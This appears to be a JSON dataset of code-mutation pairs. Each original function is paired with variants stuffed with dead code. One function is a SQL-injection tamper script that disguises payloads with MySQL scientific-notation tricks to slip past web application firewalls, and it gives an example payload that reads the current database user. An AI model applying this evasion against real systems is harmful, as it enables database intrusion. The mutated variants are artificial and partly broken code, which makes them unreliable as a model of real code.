[
    {
        "func_name": "dependencies",
        "original": "def dependencies():\n    pass",
        "mutated": [
            "def dependencies():\n    if False:\n        i = 10\n    pass",
            "def dependencies():\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    pass",
            "def dependencies():\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    pass",
            "def dependencies():\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    pass",
            "def dependencies():\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    pass"
        ]
    },
    {
        "func_name": "tamper",
        "original": "def tamper(payload, **kwargs):\n    \"\"\"\n    Abuses MySQL scientific notation\n\n    Requirement:\n        * MySQL\n\n    Notes:\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\n\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')\n    '1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'\n    \"\"\"\n    if payload:\n        payload = re.sub('[),.*^/|&]', ' 1.e\\\\g<0>', payload)\n        payload = re.sub('(\\\\w+)\\\\(', lambda match: '%s 1.e(' % match.group(1) if not re.search('(?i)\\\\A(MID|CAST|FROM|COUNT)\\\\Z', match.group(1)) else match.group(0), payload)\n    return payload",
        "mutated": [
            "def tamper(payload, **kwargs):\n    if False:\n        i = 10\n    \"\\n    Abuses MySQL scientific notation\\n\\n    Requirement:\\n        * MySQL\\n\\n    Notes:\\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\\n\\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')\\n    '1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'\\n    \"\n    if payload:\n        payload = re.sub('[),.*^/|&]', ' 1.e\\\\g<0>', payload)\n        payload = re.sub('(\\\\w+)\\\\(', lambda match: '%s 1.e(' % match.group(1) if not re.search('(?i)\\\\A(MID|CAST|FROM|COUNT)\\\\Z', match.group(1)) else match.group(0), payload)\n    return payload",
            "def tamper(payload, **kwargs):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    \"\\n    Abuses MySQL scientific notation\\n\\n    Requirement:\\n        * MySQL\\n\\n    Notes:\\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\\n\\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')\\n    '1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'\\n    \"\n    if payload:\n        payload = re.sub('[),.*^/|&]', ' 1.e\\\\g<0>', payload)\n        payload = re.sub('(\\\\w+)\\\\(', lambda match: '%s 1.e(' % match.group(1) if not re.search('(?i)\\\\A(MID|CAST|FROM|COUNT)\\\\Z', match.group(1)) else match.group(0), payload)\n    return payload",
            "def tamper(payload, **kwargs):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    \"\\n    Abuses MySQL scientific notation\\n\\n    Requirement:\\n        * MySQL\\n\\n    Notes:\\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\\n\\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')\\n    '1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'\\n    \"\n    if payload:\n        payload = re.sub('[),.*^/|&]', ' 1.e\\\\g<0>', payload)\n        payload = re.sub('(\\\\w+)\\\\(', lambda match: '%s 1.e(' % match.group(1) if not re.search('(?i)\\\\A(MID|CAST|FROM|COUNT)\\\\Z', match.group(1)) else match.group(0), payload)\n    return payload",
            "def tamper(payload, **kwargs):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    \"\\n    Abuses MySQL scientific notation\\n\\n    Requirement:\\n        * MySQL\\n\\n    Notes:\\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\\n\\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')\\n    '1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'\\n    \"\n    if payload:\n        payload = re.sub('[),.*^/|&]', ' 1.e\\\\g<0>', payload)\n        payload = re.sub('(\\\\w+)\\\\(', lambda match: '%s 1.e(' % match.group(1) if not re.search('(?i)\\\\A(MID|CAST|FROM|COUNT)\\\\Z', match.group(1)) else match.group(0), payload)\n    return payload",
            "def tamper(payload, **kwargs):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    \"\\n    Abuses MySQL scientific notation\\n\\n    Requirement:\\n        * MySQL\\n\\n    Notes:\\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\\n\\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')\\n    '1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'\\n    \"\n    if payload:\n        payload = re.sub('[),.*^/|&]', ' 1.e\\\\g<0>', payload)\n        payload = re.sub('(\\\\w+)\\\\(', lambda match: '%s 1.e(' % match.group(1) if not re.search('(?i)\\\\A(MID|CAST|FROM|COUNT)\\\\Z', match.group(1)) else match.group(0), payload)\n    return payload"
        ]
    }
]